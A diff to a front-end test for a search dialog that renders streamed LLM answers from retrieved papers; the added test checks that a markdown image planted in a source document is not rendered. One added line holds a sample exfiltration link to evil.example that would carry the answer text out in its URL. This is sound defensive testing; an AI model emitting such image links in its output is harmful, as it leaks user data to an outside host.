@@ -162,7 +162,8 @@ describe("test search dialog: answer", () => {
     const call = invoke.mock.calls.find(([cmd]) => cmd === "test_rag_answer");
     const request_id = (call?.[1] as { requestId: string }).requestId;
 
-    const answer = "根据论文，**精确档误差为 28.8%**。\n\n1. 第一点\n2. 第二点\n";
+    // The image is planted in a document: its URL would carry the answer out.
+    const answer = "根据论文，**精确档误差为 28.8%**。\n\n1. 第一点\n2. 第二点\n\n![图](https://evil.example/x.png?q=28.8)\n";
     act(() => {
       for (const token of answer.match(/.{1,5}/gs) ?? []) {
         listeners.get("llm_stream_token")?.({ payload: { token, request_id } });
@@ -173,5 +174,7 @@ describe("test search dialog: answer", () => {
     expect(screen.getByText("精确档误差为 28.8%").tagName).toBe("STRONG");
     expect(container.querySelectorAll("ol > li")).toHaveLength(2);
     expect(container.textContent).not.toContain("**");
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByText("[图]")).toBeInTheDocument();
   });
 });
